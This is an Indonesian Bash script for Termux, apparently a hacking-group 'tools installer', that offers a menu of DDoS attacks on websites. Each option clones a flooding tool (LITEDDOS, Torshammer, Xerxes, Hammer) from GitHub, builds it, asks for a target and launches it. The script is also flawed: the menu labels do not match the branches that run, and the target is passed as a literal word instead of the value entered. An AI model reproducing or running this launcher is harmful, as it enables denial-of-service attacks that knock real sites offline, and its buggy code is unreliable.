#!/system/xbin/bash
#Author InYourDfv47
#Thanks to
#Termux Termux Tools-ID
#Elite Muslim Cyber Army
#Netral Cyber Team
#2Easy 4Hack

clear
blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'                                           
yellow='\033[33;1m'
NOW=`date "+%d.%m.%Y"`
TIME=`date "+%H:%M"`

echo
toilet -f standard " InYourDfv47 " -F gay
echo
echo ""
echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
echo $green""
echo $yellow""
echo $red""
echo $white""
echo $purple" "
echo $cyan"" 
echo $green""
echo $yellow""
echo $red""
echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
echo ""
echo $white".:Ini Adalah Tools Installer Yang Dibuat Oleh InYourDfv47:."
echo $purple"...........::::::::::Karya Anak Bangsa::::::::::..........."
echo $cyan".::Bermimpi lah Setinggi Langit Karena Mimpi itu Gratis:.."
echo $green"......::::::Silahkan Pilih Tools Yang Tersedia:::::::......"
echo $yellow
date 
echo "\033[36;1m"
echo "[+]===============================================[+]"
echo $red"|  [1] Materi Hacking Ala InYourDfv47               |"
echo "[+]===============================================[+]"
echo $white"|  [2] DDOS Website Dengan LITEDDOS                 |"
echo "[+]===============================================[+]"
echo $purple"|  [3] DDOS Website Dengan Torshammer               |"
echo "[+]===============================================[+]"
echo $cyan"|  [4] DDOS Website Dengan Xerxes                   |"
echo "[+]===============================================[+]"
echo $purple"|  [00] About Me                                    |"
echo "[+]===============================================[+]"
echo $cyan"|  [0] Exit                                         |"
echo "[+]===============================================[+]"
echo
echo "\033[32;1m"
read -p "╭─[Pilih Nomer]
╰─root@Dfv47=•>" bro



if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
echo
toilet -f standard " InYourDfv47 " -F gay
echo
echo ""
echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
echo $green"|  [Author      ]: InYourDfv47 °      °         °     °  |"
echo $yellow"|  [Version     ]: Tools Installer  °       °      °   ° |"
echo $red"|  [Team        ]: Termux Tools-ID  °      °      °    ° |"
echo $white"|  [Phone       ]: 082223108828     °       °     °   °  |"
echo $purple"|  °      °	   [Thanks To All Member]     °          |"
echo $cyan"|  °	     °   °   [Termux Tools-ID] °	  	°|" 
echo $green"|°	°       °[Elite Muslim Cyber Army]°	   °   ° |"
echo $yellow"|	     °     [Nertral Cyber Team]   °    °     °   |"
echo $red"|  °	 °        °   [2Easy 4Hack]°	    °      °    °|"
echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
sleep 1
echo $green"Installing LITEDDOS..."
sleep 1
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
echo
toilet -f standard " InYourDfv47 " -F gay
echo
echo ""
echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
echo $green"|  [Author      ]: InYourDfv47 °      °         °     °  |"
echo $yellow"|  [Version     ]: Tools Installer  °       °      °   ° |"
echo $red"|  [Team        ]: Termux Tools-ID  °      °      °    ° |"
echo $white"|  [Phone       ]: 082223108828     °       °     °   °  |"
echo $purple"|  °      °	   [Thanks To All Member]     °          |"
echo $cyan"|  °	     °   °   [Termux Tools-ID] °	  	°|" 
echo $green"|°	°       °[Elite Muslim Cyber Army]°	   °   ° |"
echo $yellow"|	     °     [Nertral Cyber Team]   °    °     °   |"
echo $red"|  °	 °        °   [2Easy 4Hack]°	    °      °    °|"
echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
sleep 1
echo $green"Installing Torshammer DDOS..."
sleep 1
apt update
apt install git
apt install tor
git clone https://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer
read -p "Masukan Target:" target
python2 torshammer.py -T -t target
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
echo
toilet -f standard " InYourDfv47 " -F gay
echo
echo ""
echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
echo $green"|  [Author      ]: InYourDfv47 °      °         °     °  |"
echo $yellow"|  [Version     ]: Tools Installer  °       °      °   ° |"
echo $red"|  [Team        ]: Termux Tools-ID  °      °      °    ° |"
echo $white"|  [Phone       ]: 082223108828     °       °     °   °  |"
echo $purple"|  °      °	   [Thanks To All Member]     °          |"
echo $cyan"|  °	     °   °   [Termux Tools-ID] °	  	°|" 
echo $green"|°	°       °[Elite Muslim Cyber Army]°	   °   ° |"
echo $yellow"|	     °     [Nertral Cyber Team]   °    °     °   |"
echo $red"|  °	 °        °   [2Easy 4Hack]°	    °      °    °|"
echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
sleep 1
echo $green"Installing Xerxes DDOS..."
sleep 1
apt update && apt upgrade
apt install git
apt install clang
git clone https://github.com/zanyarjamal/xerxes
mv xerxes $HOME
cd $HOME/xerxes
clang xerxes.c -o xerxes
clear
read -p "[masukanWebsiteTarget]>" target
./xerxes target 80
fi

if [ $bro = 4 ] || [ $bro = 4 ]
then
clear
echo
toilet -f standard " InYourDfv47 " -F gay
echo
echo ""
echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
echo $green"|  [Author      ]: InYourDfv47 °      °         °     °  |"
echo $yellow"|  [Version     ]: Tools Installer  °       °      °   ° |"
echo $red"|  [Team        ]: Termux Tools-ID  °      °      °    ° |"
echo $white"|  [Phone       ]: 082223108828     °       °     °   °  |"
echo $purple"|  °      °	   [Thanks To All Member]     °          |"
echo $cyan"|  °	     °   °   [Termux Tools-ID] °	  	°|" 
echo $green"|°	°       °[Elite Muslim Cyber Army]°	   °   ° |"
echo $yellow"|	     °     [Nertral Cyber Team]   °    °     °   |"
echo $red"|  °	 °        °   [2Easy 4Hack]°	    °      °    °|"
echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
sleep 1
echo $green" Installing Hammer DDOS.."
sleep 1
git clone https://github.com/cyweb/hammer
mv hammer $HOME
cd $HOME/hammer
read -p "Masukan Target:" target
python2 hammer.py -T -t target
fi

